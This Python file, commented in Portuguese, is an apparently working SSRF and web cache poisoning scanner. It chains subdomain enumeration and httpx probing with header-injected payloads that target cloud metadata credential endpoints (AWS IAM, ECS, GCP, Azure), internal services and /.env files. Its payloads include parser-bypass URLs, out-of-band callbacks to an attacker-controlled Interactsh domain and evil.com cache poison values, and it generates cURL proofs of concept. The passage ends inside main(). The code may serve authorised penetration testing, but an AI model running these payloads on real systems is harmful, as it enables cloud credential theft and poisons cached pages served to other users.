#!/usr/bin/env python3
"""
ssrf_cache_pipeline.py
────────────────────────────────────────────────────────────────────────────
Pipeline completo: SSRF & Web Cache Poisoning via headers HTTP

Fases
  1. Enumeração   — subfinder, assetfinder, github-subdomains, chaos
  2. Validação    — httpx → salva apenas hosts vivos
  3. Scan SSRF    — headers de roteamento/proxy com payloads OOB + internos
  4. Scan Cache   — headers que influenciam cache-key com detecção OOB/reflexão

Por que OOB é crítico aqui
  SSRF e Cache Poison frequentemente são "blind":
    - SSRF: o servidor faz a request mas não reflete nada no body
    - Cache Poison: o payload é servido a terceiros, não ao atacante
  → Interactsh resolve os dois: qualquer fetch do servidor ou de um usuário
    cacheado aparece como callback DNS/HTTP no seu painel.

Dependências Go (devem estar no PATH):
  go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
  go install github.com/tomnomnom/assetfinder@latest
  go install github.com/gwen001/github-subdomains@latest
  go install github.com/projectdiscovery/chaos-client/cmd/chaos@latest
  go install github.com/projectdiscovery/httpx/cmd/httpx@latest

Dependências Python:
  pip install requests --break-system-packages

Uso:
  python3 ssrf_cache_pipeline.py -d example.com --oob SEU_ID.oast.live
  python3 ssrf_cache_pipeline.py -d example.com --oob SEU_ID.oast.live --github-token ghp_xxx
  python3 ssrf_cache_pipeline.py -d example.com --skip-recon --alive alive.txt --oob SEU_ID.oast.live
  python3 ssrf_cache_pipeline.py -t https://app.example.com --oob SEU_ID.oast.live
"""

import argparse
import json
import os
import re
import shutil
import subprocess
import sys
import threading
import time
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path

import requests

requests.packages.urllib3.disable_warnings()

# ══════════════════════════════════════════════════════════════════
#  CORES
# ══════════════════════════════════════════════════════════════════

R   = "\033[91m"
Y   = "\033[93m"
G   = "\033[92m"
C   = "\033[96m"
M   = "\033[95m"
B   = "\033[94m"
DIM = "\033[2m"
RST = "\033[0m"
BO  = "\033[1m"

def banner():
    print(f"""{B}
  ███████╗███████╗██████╗ ███████╗
  ██╔════╝██╔════╝██╔══██╗██╔════╝
  ███████╗███████╗██████╔╝█████╗
  ╚════██║╚════██║██╔══██╗██╔══╝
  ███████║███████║██║  ██║██║
  ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝
  {RST}{DIM}  SSRF & Cache Poison Pipeline  v2.0{RST}
""")

def info(m): print(f"{B}[*]{RST} {m}")
def ok(m):   print(f"{G}[+]{RST} {m}")
def warn(m): print(f"{Y}[!]{RST} {m}")
def err(m):  print(f"{R}[-]{RST} {m}")
def hit(m):  print(f"{M}[HIT]{RST} {m}")

# ══════════════════════════════════════════════════════════════════
#  HEADERS — SSRF
# ══════════════════════════════════════════════════════════════════
#
# Lógica de seleção:
#   Headers SSRF são os que fazem o servidor back-end fazer uma request
#   para um destino que ele lê do header (roteamento, proxy, rewrite).
#   Incluímos também headers de "origin IP" que alguns frameworks usam
#   para resolver hostnames internos em whitelists ou ACLs.

SSRF_HEADERS = {
    # ── URL / path rewrite — alto impacto ────────────────────────
    # Servidores como nginx/Apache com mod_rewrite lêem esses como
    # destino final da request interna
    "X-Original-URL":          "{payload}",
    "X-Rewrite-URL":           "{payload}",
    "X-Override-URL":          "{payload}",
    "X-Forwarded-Path":        "{payload}",
    "X-Original-Host":         "{payload}",

    # ── Host / roteamento de destino ──────────────────────────────
    # Proxies reversos e API gateways usam esses para decidir
    # para qual upstream backend encaminhar a request
    "X-Forwarded-Host":        "{payload}",
    "X-Host":                  "{payload}",
    "X-Forwarded-Server":      "{payload}",
    "X-HTTP-Host-Override":    "{payload}",
    "X-Forwarded-For":         "{payload}",
    "Forwarded":                "for=127.0.0.1;host={payload};proto=https",
    "X-Forwarded-Proto":       "{payload}",
    "X-Forwarded-Scheme":      "{payload}",

    # ── Proxy / upstream direto ───────────────────────────────────
    # Headers proprietários de produtos como HAProxy, Varnish, Squid
    "X-Proxy-URL":             "{payload}",
    "X-Proxy-Host":            "{payload}",
    "X-Backend-Host":          "{payload}",
    "X-Backend-URL":           "{payload}",
    "X-Remote-URL":            "{payload}",
    "X-Service-URL":           "{payload}",
    "X-Target-URL":            "{payload}",
    "X-Destination":           "{payload}",
    "X-Api-URL":               "{payload}",

    # ── Referer / Origin — usados em whitelists e fetch interno ──
    # Alguns serviços de webhook ou de preview fazem fetch da URL
    # indicada no Referer para gerar thumbnails ou validar origem
    "Referer":                 "https://{payload}/index",
    "Origin":                  "https://{payload}",
    "True-Client-IP":          "{payload}",
    "X-Real-IP":               "{payload}",
    "Client-IP":               "{payload}",

    # ── Webhook / callback — muito comuns em integrações ─────────
    # Plataformas de integração (Zapier, n8n, Stripe webhooks)
    # frequentemente aceitam a URL de callback num header
    "X-Webhook-URL":           "{payload}",
    "X-Callback-URL":          "{payload}",
    "X-Notification-URL":      "{payload}",
    "X-Return-URL":            "{payload}",
    "X-Success-URL":           "{payload}",
    "X-Redirect-URL":          "{payload}",

    # ── Import / fetch de conteúdo ────────────────────────────────
    # Serviços de importação de dados (CSV upload, RSS, sitemap)
    "X-Import-URL":            "{payload}",
    "X-Feed-URL":              "{payload}",
    "X-Resource-URL":          "{payload}",
    "X-Image-URL":             "{payload}",
    "X-Avatar-URL":            "{payload}",

    # ── Headers de cluster / service mesh ────────────────────────
    # Kubernetes, Istio, Consul usam esses para roteamento interno
    "X-Envoy-Original-Dst-Host": "{payload}",
    "X-Forwarded-By":          "{payload}",
    "X-Cluster-Client-IP":     "{payload}",
}

# ── Payloads SSRF ────────────────────────────────────────────────
#
# Três categorias:
#   1. OOB  — forçam DNS/HTTP para o Interactsh (prova blind SSRF)
#   2. Internal — metadata de cloud e IPs RFC-1918
#   3. Bypass — técnicas de bypass de whitelist/WAF

def build_ssrf_payloads(oob_domain: str | None, marker: str) -> list[dict]:
    payloads = []

    # ── OOB DNS/HTTP via Interactsh ───────────────────────────────
    if oob_domain:
        sub = f"{marker}.{oob_domain}"
        payloads += [
            {"value": sub,                       "type": "OOB_DNS",  "note": "resolução DNS direta"},
            {"value": f"http://{sub}",           "type": "OOB_HTTP", "note": "HTTP GET direto"},
            {"value": f"https://{sub}",          "type": "OOB_HTTP", "note": "HTTPS GET direto"},
            {"value": f"http://{sub}/ssrf-test", "type": "OOB_HTTP", "note": "path customizado"},
            {"value": f"//{sub}",                "type": "OOB_HTTP", "note": "protocol-relative URL"},
            # bypass de parser — alguns backends só checam o início
            {"value": f"http://legit.com@{sub}", "type": "OOB_BYPASS", "note": "userinfo bypass"},
            {"value": f"http://{sub}#@legit.com","type": "OOB_BYPASS", "note": "fragment bypass"},
            {"value": f"http://{sub}%2F%2F",     "type": "OOB_BYPASS", "note": "double-encode slash"},
        ]

    # ── Metadata de cloud ─────────────────────────────────────────
    # Cada cloud tem um endpoint de metadata acessível apenas internamente
    payloads += [
        # AWS IMDSv1 (sem token — se retornar 200 com "ami-id" é SSRF confirmado)
        {"value": "http://169.254.169.254/latest/meta-data/",         "type": "CLOUD_AWS",   "note": "AWS IMDSv1"},
        {"value": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "type": "CLOUD_AWS", "note": "AWS IAM creds"},
        {"value": "http://169.254.170.2/v2/credentials",              "type": "CLOUD_AWS",   "note": "AWS ECS task creds"},
        # GCP
        {"value": "http://metadata.google.internal/computeMetadata/v1/", "type": "CLOUD_GCP", "note": "GCP metadata (requer Metadata-Flavor header)"},
        {"value": "http://169.254.169.254/computeMetadata/v1/",       "type": "CLOUD_GCP",   "note": "GCP metadata IP"},
        # Azure
        {"value": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "type": "CLOUD_AZURE", "note": "Azure IMDS"},
        # DigitalOcean
        {"value": "http://169.254.169.254/metadata/v1/",              "type": "CLOUD_DO",    "note": "DigitalOcean metadata"},
        # Oracle Cloud
        {"value": "http://169.254.169.254/opc/v1/instance/",          "type": "CLOUD_OCI",   "note": "Oracle Cloud IMDS"},
    ]

    # ── IPs internos RFC-1918 e serviços comuns ───────────────────
    payloads += [
        {"value": "http://127.0.0.1/",           "type": "INTERNAL", "note": "localhost"},
        {"value": "http://127.0.0.1:8080/",      "type": "INTERNAL", "note": "localhost:8080"},
        {"value": "http://127.0.0.1:8443/",      "type": "INTERNAL", "note": "localhost:8443"},
        {"value": "http://127.0.0.1:9200/",      "type": "INTERNAL", "note": "Elasticsearch"},
        {"value": "http://127.0.0.1:6379/",      "type": "INTERNAL", "note": "Redis"},
        {"value": "http://127.0.0.1:27017/",     "type": "INTERNAL", "note": "MongoDB"},
        {"value": "http://10.0.0.1/",            "type": "INTERNAL", "note": "gateway RFC-1918"},
        {"value": "http://192.168.1.1/",         "type": "INTERNAL", "note": "gateway residencial"},
        {"value": "http://172.16.0.1/",          "type": "INTERNAL", "note": "RFC-1918 /12"},
        {"value": "http://[::1]/",               "type": "INTERNAL", "note": "IPv6 loopback"},
        {"value": "http://[::ffff:127.0.0.1]/",  "type": "INTERNAL", "note": "IPv4-mapped IPv6"},
        # paths internos comuns
        {"value": "/admin",                      "type": "PATH",     "note": "admin panel"},
        {"value": "/internal/config",            "type": "PATH",     "note": "config endpoint"},
        {"value": "/actuator",                   "type": "PATH",     "note": "Spring Boot actuator"},
        {"value": "/actuator/env",               "type": "PATH",     "note": "Spring Boot env"},
        {"value": "/.env",                       "type": "PATH",     "note": "dotenv file"},
        {"value": "/api/v1/internal",            "type": "PATH",     "note": "internal API"},
        # hostnames internos
        {"value": "internal-service.local",      "type": "HOSTNAME", "note": "hostname .local"},
        {"value": "internal.local",              "type": "HOSTNAME", "note": "hostname interno"},
        {"value": "localhost",                   "type": "HOSTNAME", "note": "localhost hostname"},
        {"value": "metadata.internal",           "type": "HOSTNAME", "note": "GCP metadata hostname"},
    ]

    return payloads

# ── Keywords que indicam resposta de metadata/interno ────────────
SSRF_RESPONSE_KEYWORDS = [
    # AWS
    "ami-id", "instance-id", "security-credentials", "iam",
    "aws_access_key_id", "aws_secret_access_key",
    # GCP
    "computemetadata", "serviceaccounts", "google",
    # Azure
    "azure", "msft", "subscriptionid",
    # Genérico
    "internal", "localhost", "127.0.0.1", "10.0.", "172.16.",
    "192.168.", "admin", "actuator", "spring",
    # erro de redirect revelando host interno
    "connection refused", "no route to host",
]

# ══════════════════════════════════════════════════════════════════
#  HEADERS — CACHE POISON
# ══════════════════════════════════════════════════════════════════
#
# Headers de cache poison são os que:
#   a) Influenciam a response (e portanto são "unkeyed" para o cache)
#   b) São refletidos no body ou em headers de response
#   c) Alteram o comportamento do servidor mas NÃO entram na cache key
#
# Se um header não está na cache-key mas muda a response → poison.

CACHE_HEADERS = {
    # ── Host / domínio — altera URLs geradas dinamicamente ───────
    "X-Forwarded-Host":    "{payload}",   # refletido em Location, canonical links
    "X-Host":              "{payload}",
    "X-Forwarded-Server":  "{payload}",
    "X-HTTP-Host-Override":"{payload}",

    # ── Scheme — força HTTP vs HTTPS em redirects/canonical ──────
    "X-Forwarded-Proto":   "{payload}",   # "http" força downgrade
    "X-Forwarded-Scheme":  "{payload}",
    "X-Scheme":            "{payload}",
    "X-Forwarded-SSL":     "{payload}",   # "off" pode desabilitar HSTS

    # ── Porta — altera URLs geradas com porta explícita ──────────
    "X-Forwarded-Port":    "{payload}",   # ex: 80 → https://host:80/path

    # ── IP do cliente — altera conteúdo geo-dependente ───────────
    # Se o cache guarda a response sem incluir esses na key,
    # qualquer usuário vê o conteúdo da "localização" do atacante
    "X-Forwarded-For":     "{payload}",
    "X-Real-IP":           "{payload}",
    "CF-Connecting-IP":    "{payload}",
    "True-Client-IP":      "{payload}",
    "X-Client-IP":         "{payload}",

    # ── Linguagem / localidade — conteúdo localizado ─────────────
    "Accept-Language":     "{payload}",   # pode mudar toda a página
    "X-Language":          "{payload}",
    "X-Country-Code":      "{payload}",
    "CF-IPCountry":        "{payload}",
}

# ── Payloads de cache poison ──────────────────────────────────────

def build_cache_payloads(oob_domain: str | None, marker: str) -> list[dict]:
    payloads = []

    if oob_domain:
        sub = f"{marker}.{oob_domain}"
        payloads += [
            # host poison — qualquer link gerado vai apontar para o OOB
            {"value": sub,               "type": "OOB_HOST",   "note": "host direto → refletido em links"},
            {"value": f"http://{sub}",   "type": "OOB_URL",    "note": "URL completa → Location / canonical"},
            {"value": f"{sub}:443",      "type": "OOB_PORT",   "note": "host:porta"},
            # scheme poison
            {"value": "http",            "type": "SCHEME_DOWN", "note": "downgrade HTTPS→HTTP"},
            {"value": "javascript",      "type": "SCHEME_JS",   "note": "javascript: scheme (raro mas impactante)"},
            # port poison
            {"value": "80",              "type": "PORT_DOWN",   "note": "força porta 80"},
            {"value": "443",             "type": "PORT_STD",    "note": "porta padrão HTTPS"},
            # lang poison — troca idioma do conteúdo cacheado
            {"value": f"xx-{marker}",    "type": "LANG",        "note": "Accept-Language inválido — log/reflection"},
        ]

    # payloads clássicos sem OOB (detecção por reflexão no body/headers)
    payloads += [
        {"value": "evil.com",              "type": "HOST_REFL",  "note": "domínio reflexão"},
        {"value": "evil.com:443",          "type": "HOST_PORT",  "note": "host + porta"},
        {"value": "http://evil.com",       "type": "URL_REFL",   "note": "URL completa"},
        {"value": "http",                  "type": "SCHEME_HTTP","note": "scheme HTTP"},
        {"value": "80",                    "type": "PORT_80",    "note": "port 80"},
        {"value": "8080",                  "type": "PORT_8080",  "note": "port alt"},
        {"value": "xx",                    "type": "LANG_XX",    "note": "Accept-Language inválido"},
    ]

    return payloads

# Keywords que indicam reflexão do payload na response
CACHE_REFLECTION_KEYWORDS = [
    "evil.com",        # payload clássico refletido
    "evil.com:443",
    "http://evil.com",
]

# Headers de response que indicam cache ou reflexão
CACHE_RESPONSE_HEADERS = [
    "Location", "Link", "X-Cache", "Via", "Age",
    "CF-Cache-Status", "X-Varnish", "X-Cache-Hits",
    "Surrogate-Key", "Cache-Control",
]

# ══════════════════════════════════════════════════════════════════
#  HELPERS HTTP
# ══════════════════════════════════════════════════════════════════

def req(url: str, headers: dict | None = None, timeout: int = 12) -> dict | None:
    try:
        r = requests.get(
            url,
            headers=headers or {},
            timeout=timeout,
            verify=False,
            allow_redirects=True,
        )
        return {
            "status":  r.status_code,
            "body":    r.text.lower(),
            "headers": {k.lower(): v for k, v in r.headers.items()},
            "history": r.history,
            "raw":     r.text,
        }
    except Exception as e:
        return None


def get_signature(resp: dict | None) -> tuple:
    if not resp:
        return (0, "", "", 0)
    return (
        resp["status"],
        resp["headers"].get("content-type", ""),
        resp["headers"].get("location", ""),
        round(len(resp["body"]), -2),   # arredondado em 100 chars
    )


def build_curl(url: str, headers: dict, note: str = "") -> str:
    h_str = " \\\n".join(f'  -H "{k}: {v}"' for k, v in headers.items())
    suffix = f"  # {note}" if note else ""
    return f'curl -i -s -k "{url}" \\\n{h_str}{suffix}'

# ══════════════════════════════════════════════════════════════════
#  FASE 3 — SCAN SSRF
# ══════════════════════════════════════════════════════════════════

def scan_ssrf(url: str, oob_domain: str | None) -> list[dict]:
    findings = []

    baseline = req(url)
    if not baseline:
        warn(f"SSRF baseline falhou: {url}")
        return []
    base_sig = get_signature(baseline)

    marker   = uuid.uuid4().hex[:10]
    payloads = build_ssrf_payloads(oob_domain, f"ssrf-{marker}")

    for header_template, value_template in SSRF_HEADERS.items():
        for pl in payloads:
            value = value_template.replace("{payload}", pl["value"])

            resp = req(url, headers={header_template: value})
            if not resp:
                continue

            time.sleep(0.15)

            sig = get_signature(resp)
            found = False
            finding_type = ""
            evidence     = ""

            # 1. Diff estrutural — response mudou significativamente
            if sig != base_sig:
                finding_type = "SSRF_STRUCTURAL_DIFF"
                evidence     = (
                    f"status {base_sig[0]}→{sig[0]}, "
                    f"location '{base_sig[2]}'→'{sig[2]}', "
                    f"size Δ{abs(sig[3]-base_sig[3])}"
                )
                found = True

            # 2. Keyword de metadata/interno refletida no body
            for kw in SSRF_RESPONSE_KEYWORDS:
                if kw in resp["body"] and kw not in baseline["body"]:
                    finding_type = "SSRF_KEYWORD_REFLECTION"
                    evidence     = f"keyword '{kw}' refletida no body"
                    found = True
                    break

            # 3. Redirect para destino interno/OOB
            if resp["history"]:
                for hist in resp["history"]:
                    loc = hist.headers.get("Location", "")
                    if any(kw in loc.lower() for kw in ["internal", "localhost", "127.", "10.", "169.254"]):
                        finding_type = "SSRF_REDIRECT_INTERNAL"
                        evidence     = f"redirect para {loc}"
                        found = True
                    if oob_domain and oob_domain in loc:
                        finding_type = "SSRF_REDIRECT_OOB"
                        evidence     = f"redirect para OOB: {loc}"
                        found = True

            # 4. OOB — payload foi enviado; confirmação vem do Interactsh
            if pl["type"].startswith("OOB") and not found:
                finding_type = "SSRF_OOB_DISPATCHED"
                evidence     = f"payload OOB disparado — marker: {marker}"
                found = True

            if found:
                f = {
                    "url":         url,
                    "type":        finding_type,
                    "header":      header_template,
                    "payload":     value,
                    "pl_type":     pl["type"],
                    "pl_note":     pl["note"],
                    "confidence":  _confidence_ssrf(finding_type),
                    "evidence":    evidence,
                    "status":      resp["status"],
                    "marker":      marker,
                    "oob_domain":  oob_domain or "",
                    "curl":        build_curl(url, {header_template: value}, pl["note"]),
                }
                findings.append(f)
                hit(f"{f['confidence']:10s} | SSRF | {header_template} → {pl['type']} | {url}")

    return findings


def _confidence_ssrf(ftype: str) -> str:
    return {
        "SSRF_REDIRECT_OOB":       "CRITICAL",
        "SSRF_KEYWORD_REFLECTION": "HIGH",
        "SSRF_REDIRECT_INTERNAL":  "HIGH",
        "SSRF_OOB_DISPATCHED":     "MEDIUM (aguarda callback)",
        "SSRF_STRUCTURAL_DIFF":    "LOW (requer verificação manual)",
    }.get(ftype, "INFO")

# ══════════════════════════════════════════════════════════════════
#  FASE 4 — SCAN CACHE POISON
# ══════════════════════════════════════════════════════════════════

def scan_cache_poison(url: str, oob_domain: str | None) -> list[dict]:
    findings = []

    # Baseline sem cache buster
    baseline = req(url)
    if not baseline:
        warn(f"Cache baseline falhou: {url}")
        return []

    marker   = uuid.uuid4().hex[:10]
    payloads = build_cache_payloads(oob_domain, f"cp-{marker}")

    for header_template, value_template in CACHE_HEADERS.items():
        for pl in payloads:
            value = value_template.replace("{payload}", pl["value"])

            # Cache buster único — garante que não pegamos cache antigo
            buster   = uuid.uuid4().hex[:8]
            test_url = f"{url}{'&' if '?' in url else '?'}cb={buster}"

            # Passo 1: request "envenenada"
            poison_resp = req(test_url, headers={header_template: value})
            if not poison_resp:
                continue
            time.sleep(1.2)   # aguarda o cache guardar a response envenenada

            # Passo 2: request limpa no mesmo cache buster
            clean_resp = req(test_url)
            if not clean_resp:
                continue

            time.sleep(0.15)

            found        = False
            finding_type = ""
            evidence     = ""

            # 1. OOB refletido em headers de response da request envenenada
            if oob_domain:
                sub = f"cp-{marker}.{oob_domain}"
                for rh in CACHE_RESPONSE_HEADERS:
                    val = poison_resp["headers"].get(rh.lower(), "")
                    if sub in val or oob_domain in val:
                        finding_type = "CACHE_OOB_HEADER_REFLECTION"
                        evidence     = f"OOB refletido em {rh}: {val}"
                        found = True

            # 2. Payload refletido no body da response envenenada
            for kw in CACHE_REFLECTION_KEYWORDS:
                if kw in poison_resp["body"] and kw not in baseline["body"]:
                    finding_type = "CACHE_BODY_REFLECTION"
                    evidence     = f"'{kw}' refletido no body"
                    found = True
                    break

            # 3. Cache poison confirmado — response limpa tem o payload
            if clean_resp and not found:
                for kw in CACHE_REFLECTION_KEYWORDS:
                    if kw in clean_resp["body"] and kw not in baseline["body"]:
                        finding_type = "CACHE_POISON_CONFIRMED"
                        evidence     = f"'{kw}' persistiu na response limpa (poison confirmado)"
                        found = True
                        break
                if oob_domain:
                    sub = f"cp-{marker}.{oob_domain}"
                    if sub in clean_resp["body"]:
                        finding_type = "CACHE_POISON_OOB_CONFIRMED"
                        evidence     = "OOB persistiu na response limpa"
                        found = True

            # 4. Cache headers reveladores na response envenenada
            for rh in ["X-Cache", "CF-Cache-Status", "X-Varnish", "Age"]:
                rv = poison_resp["headers"].get(rh.lower(), "")
                if rv and not found:
                    # HIT na primeira request com payload = poison já estava cacheado
                    if "hit" in rv.lower():
                        finding_type = "CACHE_HIT_ON_POISON"
                        evidence     = f"{rh}: {rv} — cache HIT na request envenenada"
                        found = True

            # 5. OOB dispatched — confiança média, aguarda callback
            if pl["type"].startswith("OOB") and not found:
                finding_type = "CACHE_OOB_DISPATCHED"
                evidence     = f"payload OOB enviado — marker: {marker}"
                found = True

            if found:
                f = {
                    "url":        url,
                    "type":       finding_type,
                    "header":     header_template,
                    "payload":    value,
                    "pl_type":    pl["type"],
                    "pl_note":    pl["note"],
                    "confidence": _confidence_cache(finding_type),
                    "evidence":   evidence,
                    "status":     poison_resp["status"],
                    "marker":     marker,
                    "oob_domain": oob_domain or "",
                    "curl":       build_curl(test_url, {header_template: value}, pl["note"]),
                }
                findings.append(f)
                hit(f"{f['confidence']:10s} | CACHE | {header_template} → {pl['type']} | {url}")

    return findings


def _confidence_cache(ftype: str) -> str:
    return {
        "CACHE_POISON_CONFIRMED":      "CRITICAL",
        "CACHE_POISON_OOB_CONFIRMED":  "CRITICAL",
        "CACHE_OOB_HEADER_REFLECTION": "HIGH",
        "CACHE_BODY_REFLECTION":       "HIGH",
        "CACHE_HIT_ON_POISON":         "MEDIUM",
        "CACHE_OOB_DISPATCHED":        "MEDIUM (aguarda callback)",
    }.get(ftype, "INFO")

# ══════════════════════════════════════════════════════════════════
#  RECON (reaproveitado do pipeline SQLi)
# ══════════════════════════════════════════════════════════════════

def run_tool(cmd: list[str], name: str, timeout: int = 300) -> set[str]:
    results: set[str] = set()
    try:
        info(f"Rodando {name}...")
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        for line in proc.stdout.splitlines():
            line = line.strip().lower()
            if line and re.match(r'^[a-z0-9*._-]+\.[a-z]{2,}$', line):
                results.add(line)
        ok(f"{name}: {len(results)} subdomínios")
    except subprocess.TimeoutExpired:
        warn(f"{name}: timeout após {timeout}s")
    except FileNotFoundError:
        warn(f"{name}: não encontrado no PATH — pulando")
    except Exception as e:
        warn(f"{name}: erro — {e}")
    return results


def enumerate_subdomains(domain: str, output_dir: Path,
                         github_token: str | None, chaos_key: str | None) -> set[str]:
    all_subs: set[str] = set()
    all_subs |= run_tool(["subfinder", "-d", domain, "-silent", "-all"], "subfinder")
    all_subs |= run_tool(["assetfinder", "--subs-only", domain], "assetfinder")

    if github_token:
        all_subs |= run_tool(
            ["github-subdomains", "-d", domain, "-t", github_token, "-raw"],
            "github-subdomains",
        )
    else:
        warn("github-subdomains: pulado (use --github-token)")

    ck = chaos_key or os.environ.get("PDCP_API_KEY") or os.environ.get("CHAOS_KEY")
    if ck and shutil.which("chaos"):
        all_subs |= run_tool(["chaos", "-d", domain, "-key", ck, "-silent"], "chaos")
    else:
        warn("chaos: pulado (sem chave)")

    all_subs = {s for s in all_subs if s.endswith(f".{domain}") or s == domain}
    ok(f"Total único: {len(all_subs)} subdomínios")

    (output_dir / "subdomains_raw.txt").write_text("\n".join(sorted(all_subs)))
    return all_subs


def validate_with_httpx(subdomains: set[str], output_dir: Path,
                        httpx_threads: int = 50) -> list[dict]:
    if not subdomains:
        return []

    input_file  = output_dir / "subdomains_raw.txt"
    output_file = output_dir / "httpx_output.txt"
    info(f"Validando {len(subdomains)} subdomínios com httpx...")

    cmd = [
        "httpx", "-l", str(input_file), "-o", str(output_file),
        # sem -silent: permite que o httpx escreva no arquivo -o corretamente
        "-status-code", "-title", "-tech-detect",
        "-follow-redirects", "-threads", str(httpx_threads),
        "-timeout", "10", "-json", "-no-color",
    ]

    stdout_lines: list[str] = []
    try:
        # capture_output=True captura stdout para fallback caso -o saia vazio
        proc = subprocess.run(cmd, timeout=600, check=False,
                              capture_output=True, text=True)
        stdout_lines = proc.stdout.splitlines()
        # exibe no terminal para acompanhamento em tempo real
        for ln in stdout_lines:
            if ln.strip():
                print(f"  {ln}", flush=True)
    except FileNotFoundError:
        err("httpx não encontrado — probe manual ativado")
        return _fallback_probe(subdomains)
    except subprocess.TimeoutExpired:
        warn("httpx: timeout global — usando resultados parciais")

    # Prioridade: arquivo -o → stdout capturado
    # Bug de compatibilidade: httpx moderno usa "status_code" (underscore),
    # versões antigas usavam "status-code" (hífen). Aceitamos ambos.
    raw_lines: list[str] = []
    if output_file.exists() and output_file.stat().st_size > 0:
        raw_lines = output_file.read_text(errors="replace").splitlines()
        info(f"httpx: lendo {len(raw_lines)} linhas de {output_file.name}")
    elif stdout_lines:
        raw_lines = stdout_lines
        warn(f"httpx: arquivo -o vazio, usando stdout ({len(raw_lines)} linhas)")
        output_file.write_text("\n".join(raw_lines))
    else:
        warn("httpx: sem saída — verifique se o binário está atualizado")

    alive: list[dict] = []
    for line in raw_lines:
        line = line.strip()
        if not line:
            continue
        try:
            obj = json.loads(line)
            # aceita status_code (novo) ou status-code (legado)
            status = obj.get("status_code") or obj.get("status-code") or 0
            if not status:
                continue
            url = obj.get("url", "").strip()
            if not url:
                continue
            # tech pode ser list[str] (antigo) ou list[dict] (novo com versão)
            raw_tech = obj.get("tech", []) or []
            if raw_tech and isinstance(raw_tech[0], dict):
                tech_list = [t.get("name", str(t)) for t in raw_tech]
            else:
                tech_list = [str(t) for t in raw_tech]
            alive.append({
                "url":      url,
                "status":   int(status),
                "title":    obj.get("title", ""),
                "tech":     tech_list,
                "cdn":      obj.get("cdn", False),
                "cdn_name": obj.get("cdn_name", ""),
            })
        except (json.JSONDecodeError, ValueError):
            if line.startswith("http"):
                alive.append({"url": line, "status": 200, "title": "",
                              "tech": [], "cdn": False, "cdn_name": ""})

    ok(f"Hosts vivos: {len(alive)}")
    (output_dir / "alive.txt").write_text("\n".join(h["url"] for h in alive))
    return alive


def _fallback_probe(subdomains: set[str]) -> list[dict]:
    alive, lock = [], threading.Lock()

    def probe(sub: str):
        for scheme in ["https://", "http://"]:
            url = scheme + sub
            try:
                r = requests.get(url, timeout=8, verify=False, allow_redirects=True)
                with lock:
                    alive.append({"url": url, "status": r.status_code, "title": "", "tech": []})
                return
            except Exception:
                pass

    with ThreadPoolExecutor(max_workers=30) as ex:
        list(ex.map(probe, subdomains))
    return alive

# ══════════════════════════════════════════════════════════════════
#  REPORT
# ══════════════════════════════════════════════════════════════════

def print_finding(f: dict, idx: int):
    col = {"CRITICAL": R, "HIGH": M, "MEDIUM": Y}.get(
        f["confidence"].split()[0], C
    )
    print(f"\n{BO}{'─'*62}{RST}")
    print(f"{BO}[#{idx}] {col}{f['confidence']}{RST} — {f['type']}")
    print(f"  URL     : {f['url']}")
    print(f"  Header  : {f['header']}")
    print(f"  Payload : {f['payload'][:100]}")
    print(f"  Nota    : {f['pl_note']}")
    print(f"  Evidência: {f['evidence']}")
    if f.get("oob_domain"):
        print(f"\n  {BO}Interactsh — aguarde callback:{RST}")
        print(f"    marker : {f['marker']}")
        print(f"    cmd    : interactsh-client -s {f['oob_domain']}")
    print(f"\n  {BO}cURL PoC:{RST}")
    for line in f["curl"].split("\n"):
        print(f"    {line}")


def save_report(all_findings: list[dict], output_dir: Path):
    ts     = datetime.now().strftime("%Y%m%d_%H%M%S")
    # JSON
    jp = output_dir / f"findings_{ts}.json"
    jp.write_text(json.dumps(all_findings, indent=2, ensure_ascii=False))
    ok(f"JSON salvo: {jp}")
    # Markdown
    mp  = output_dir / f"report_{ts}.md"
    md  = [f"# SSRF & Cache Poison Report\n\n**Data:** {datetime.now().isoformat()}\n",
           f"**Total:** {len(all_findings)} findings\n\n---\n"]
    for i, f in enumerate(all_findings, 1):
        md.append(
            f"\n## [{i}] {f['confidence']} — {f['type']}\n\n"
            f"- **URL:** `{f['url']}`\n"
            f"- **Header:** `{f['header']}`\n"
            f"- **Payload:** `{f['payload'][:100]}`\n"
            f"- **Evidência:** {f['evidence']}\n\n"
            f"```bash\n{f['curl']}\n```\n"
        )
    mp.write_text("\n".join(md))
    ok(f"Markdown salvo: {mp}")

# ══════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description="Pipeline: recon → httpx → SSRF + Cache Poison",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemplos:
  %(prog)s -d example.com --oob abc.oast.live
  %(prog)s -d example.com --oob abc.oast.live --github-token ghp_xxx
  %(prog)s -t https://app.example.com --oob abc.oast.live
  %(prog)s -d example.com --skip-recon --alive alive.txt --oob abc.oast.live
  %(prog)s -d example.com --only-recon

Interactsh:
  go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
  interactsh-client    # gera o domínio OOB, use com --oob
        """,
    )
    grp = parser.add_mutually_exclusive_group(required=True)
    grp.add_argument("-d", "--domain", help="Domínio raiz para recon completo")
    grp.add_argument("-t", "--target", help="URL única (pula recon)")

    parser.add_argument("--oob",          metavar="DOMAIN",  help="Domínio Interactsh OOB")
    parser.add_argument("--github-token", metavar="TOKEN",   help="GitHub PAT para github-subdomains")
    parser.add_argument("--chaos-key",    metavar="KEY",     help="API key do Chaos")
    parser.add_argument("--skip-recon",   action="store_true")
    parser.add_argument("--only-recon",   action="store_true")
    parser.add_argument("--alive",        metavar="FILE",    help="Arquivo com URLs vivas")
    parser.add_argument("--threads",      type=int, default=5)
    parser.add_argument("--httpx-threads",type=int, default=50)
    parser.add_argument("--output-dir",   metavar="DIR",     default=None)
    parser.add_argument("--skip-ssrf",    action="store_true", help="Só Cache Poison")
    parser.add_argument("--skip-cache",   action="store_true", help="Só SSRF")

    args = parser.parse_args()
    banner()

    ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
    domain_slug = args.domain or re.sub(r'https?://', '', args.target).split('/')[0]
    odir = Path(args.output_dir or f"ssrf_cache_{domain_slug}_{ts}")
    odir.mkdir(parents=True, exist_ok=True)
    info(f"Saída: {odir.resolve()}")

